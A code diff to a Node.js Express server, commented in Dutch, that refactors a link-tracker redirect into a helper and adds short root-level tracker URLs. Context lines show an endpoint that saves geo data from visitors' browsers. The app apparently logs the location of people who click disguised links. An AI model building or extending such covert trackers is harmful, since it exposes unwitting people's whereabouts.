@@ -46,18 +46,15 @@ app.get('/', (req, res) => {
 });
 
 // === TRACKER ===
-// === TRACKER ===
-app.get('/track/:id', async (req, res) => {
-  const trackerId = req.params.id;
-  let ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim().replace('::ffff:', '');
-
+// Helper voor tracker redirect
+async function handleTrackerRedirect(trackerId, res) {
   let destinationUrl = "https://youtube.com"; // fallback
 
   try {
     if (fs.existsSync('trackers.json')) {
       const trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
       const tracker = trackers.find(t => t.tracker_id === trackerId);
-      
+
       if (tracker && tracker.destination_url) {
         destinationUrl = tracker.destination_url;
         console.log(`✅ Bestemming gevonden: ${destinationUrl}`);
@@ -67,7 +64,6 @@ app.get('/track/:id', async (req, res) => {
     } else {
       console.log("⚠️ trackers.json bestaat niet");
     }
-
   } catch (error) {
     console.error("Fout bij ophalen destination:", error);
   }
@@ -77,6 +73,10 @@ app.get('/track/:id', async (req, res) => {
   let html = fs.readFileSync(__dirname + '/views/redirect.html', 'utf8');
   html = html.replace("{{DESTINATION_URL}}", destinationUrl);
   res.send(html);
+}
+
+app.get('/track/:id', async (req, res) => {
+  await handleTrackerRedirect(req.params.id, res);
 });
 
 // === API: Geo data vanuit browser opslaan ===
@@ -150,7 +150,7 @@ app.post('/api/save-tracker', auth, (req, res) => {
 
     fs.writeFileSync('trackers.json', JSON.stringify(trackers, null, 2));
     console.log(`✅ Tracker opgeslagen: ${tracker_id}`);
-    res.json({ success: true, tracker_id, link: `/track/${tracker_id}` });
+    res.json({ success: true, tracker_id, link: `/${tracker_id}` });
   } catch (e) {
     console.error("Save tracker error:", e);
     res.status(500).json({ error: "Save failed" });
@@ -203,6 +203,17 @@ app.get('/api/logs', auth, (req, res) => {
   } else {
     res.json([]);
   }
+});
+
+app.get('/:trackerId', async (req, res, next) => {
+  const reserved = ['api', 'admin', 'favicon.ico'];
+  const trackerId = req.params.trackerId;
+
+  if (reserved.includes(trackerId.toLowerCase())) {
+    return next();
+  }
+
+  await handleTrackerRedirect(trackerId, res);
 });
 
 const PORT = process.env.PORT || 3000;
